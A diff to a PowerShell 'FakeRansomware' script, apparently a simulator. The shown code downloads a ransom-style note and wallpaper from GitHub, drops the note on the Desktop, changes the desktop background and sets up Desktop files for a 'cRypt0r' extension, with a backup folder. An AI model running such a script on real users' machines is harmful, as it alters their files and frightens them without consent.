@@ -7,15 +7,15 @@
         mkdir $folder_base -ea ignore | Out-Null
     $wallpaper = "$folder_base\Wallpaper.jpg"
     $note = "$folder_base\READ_ME.txt"
-  
-    Invoke-WebRequest "https://github.com/Andreas6920/FakeRansomware/raw/main/resources/Background.jpg" -o $wallpaper
 
+    Invoke-WebRequest "https://github.com/Andreas6920/FakeRansomware/raw/main/resources/Background.jpg" -o $wallpaper
+    Invoke-WebRequest "https://github.com/Andreas6920/FakeRansomware/raw/main/resources/note.txt" -o $note
 
 #File encryption
-$targetdir = [Environment]::GetFolderPath("Desktop")
-$backupdir = [Environment]::GetFolderPath("MyDocuments") + "\backup"
-$files = (get-childitem -File $targetdir -Depth 100).FullName | where { ! $_.PSIsContainer }
-$fileextension = "cRypt0r"
+    $targetdir = [Environment]::GetFolderPath("Desktop")
+    $backupdir = [Environment]::GetFolderPath("MyDocuments") + "\backup"
+    $files = (get-childitem -File $targetdir -Depth 100).FullName | where { ! $_.PSIsContainer }
+    $fileextension = "cRypt0r"
 
 
 #Copy folder structure
@@ -165,6 +165,12 @@ $ret = [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $fWinIni
 Set-WallPaper -Image $wallpaper -Style Stretch | Out-Null
 
 
+$note = "$folder_base\READ_ME.txt"
+$targetdir = [Environment]::GetFolderPath("Desktop")
+$backupdir = [Environment]::GetFolderPath("MyDocuments") + "\backup"
+
+Copy-Item -Path $note -Destination $targetdir | Out-Null
+
 
 
 
@@ -175,32 +181,32 @@ write-host "your data is safe. check $backup_folder" -f Yellow
 
 $intro = 
 '
-             uuuuuuu
-         uu$$$$$$$$$$$uu 
-      uu$$$$$$$$$$$$$$$$$uu
-     u$$$$$$$$$$$$$$$$$$$$$u
-    u$$$$$$$$$$$$$$$$$$$$$$$u
-   u$$$$$$$$$$$$$$$$$$$$$$$$$u
-   u$$$$$$$$$$$$$$$$$$$$$$$$$u
-   u$$$$$$"   "$$$"   "$$$$$$u
-   "$$$$"      u$u       $$$$"
-    $$$u       u$u       u$$$
-    $$$u      u$$$u      u$$$
-     "$$$$uu$$$   $$$uu$$$$"
-      "$$$$$$$"   "$$$$$$$"
-        u$$$$$$$u$$$$$$$u
-         u$"$"$"$"$"$"$u
-uuu        $$u$ $ $ $ $u$$       uuu
-u$$$$        $$$$$u$u$u$$$       u$$$$
-$$$$$uu      "$$$$$$$$$"     uu$$$$$$
-u$$$$$$$$$$$uu    """""    uuuu$$$$$$$$$$
-$$$$"""$$$$$$$$$$uuu   uu$$$$$$$$$"""$$$"
-"""      ""$$$$$$$$$$$uu ""$"""
-       uuuu ""$$$$$$$$$$uuu
-u$$$uuu$$$$$$$$$uu ""$$$$$$$$$$$uuu$$$
-$$$$$$$$$$""""           ""$$$$$$$$$$$"
-"$$$$$"                      ""$$$$""
- $$$"                         $$$$"
+                  uuuuuuu
+              uu$$$$$$$$$$$uu 
+           uu$$$$$$$$$$$$$$$$$uu
+          u$$$$$$$$$$$$$$$$$$$$$u
+         u$$$$$$$$$$$$$$$$$$$$$$$u
+        u$$$$$$$$$$$$$$$$$$$$$$$$$u
+        u$$$$$$$$$$$$$$$$$$$$$$$$$u
+        u$$$$$$"   "$$$"   "$$$$$$u
+        "$$$$"      u$u       $$$$"
+         $$$u       u$u       u$$$
+         $$$u      u$$$u      u$$$
+          "$$$$uu$$$   $$$uu$$$$"
+           "$$$$$$$"   "$$$$$$$"
+             u$$$$$$$u$$$$$$$u
+              u$"$"$"$"$"$"$u
+   uuu        $$u$ $ $ $ $u$$       uuu
+   u$$$$        $$$$$u$u$u$$$       u$$$$
+   $$$$$uu      "$$$$$$$$$"     uu$$$$$$
+   u$$$$$$$$$$$uu    """""    uuuu$$$$$$$$$$
+   $$$$"""$$$$$$$$$$uuu   uu$$$$$$$$$"""$$$"
+   """      ""$$$$$$$$$$$uu ""$"""
+          uuuu ""$$$$$$$$$$uuu
+   u$$$uuu$$$$$$$$$uu ""$$$$$$$$$$$uuu$$$
+   $$$$$$$$$$""""           ""$$$$$$$$$$$"
+   "$$$$$"                      ""$$$$""
+    $$$"                         $$$$"
                                                                                                                                                 
 '
 1..99 | % {
